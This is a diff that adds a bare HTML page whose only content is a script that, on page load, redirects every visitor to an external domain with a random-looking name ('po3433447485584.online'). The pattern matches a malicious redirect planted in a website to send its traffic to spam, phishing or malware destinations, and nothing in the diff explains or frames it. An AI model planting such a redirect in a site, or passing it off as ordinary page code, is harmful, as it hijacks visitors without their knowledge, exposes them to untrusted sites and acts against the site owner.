@@ -1,0 +1,7 @@
+<!doctype html>
+<html>
+<head>
+<script>
+location.assign("https://po3433447485584.online/?i=i");
+</script>
+</head>
